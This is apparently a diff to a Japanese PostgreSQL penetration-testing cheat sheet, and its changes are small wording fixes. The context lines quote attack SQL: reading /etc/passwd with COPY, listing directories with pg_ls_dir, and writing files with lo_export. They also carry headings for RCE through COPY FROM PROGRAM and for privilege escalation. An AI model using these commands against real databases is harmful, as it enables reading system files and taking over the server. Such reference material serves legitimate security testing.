@@ -159,7 +159,7 @@ SELECT routines.routine_name, parameters.data_type FROM information_schema.routi
 
 ## ファイルシステム操作
 
-スーパーユーザーまたは pg_read_server_files グループのメンバーが実行可能
+スーパーユーザーまたは pg_read_server_files グループのメンバーが実行可能。
 
 ファイルの読み取り
 ```sql
@@ -168,7 +168,7 @@ COPY demo FROM '/etc/passwd';
 SELECT * FROM demo;
 ```
 
-管理者用関数による操作（postgres DBへ切り替えて実行すること）
+管理者用関数による操作
 ```sql
 \c postgres
 SELECT * FROM pg_ls_dir('/tmp');
@@ -209,7 +209,6 @@ SELECT lo_from_bytea(<oid>,decode('<BASE64_EDITED_FILENODE>','base64'))
 SELECT lo_export(<oid>,'<full_path>')
 ```
 
-
 ## RCE
 
 ### COPY ... FROM PROGRAM による実行
@@ -234,7 +233,7 @@ DO $$DECLARE cmd text;BEGIN
 
 ## Privilege Escalation
 
-PostgreSQL は権限を制限しているため、これでrootになれるわけではない。Postgre
+PostgreSQL は権限を制限しているため、これでrootになれるわけではない。PostgreSQL 内で最高の権限はスーパーユーザー。
 
 CREATEROLE 特権による昇格
 ```sql
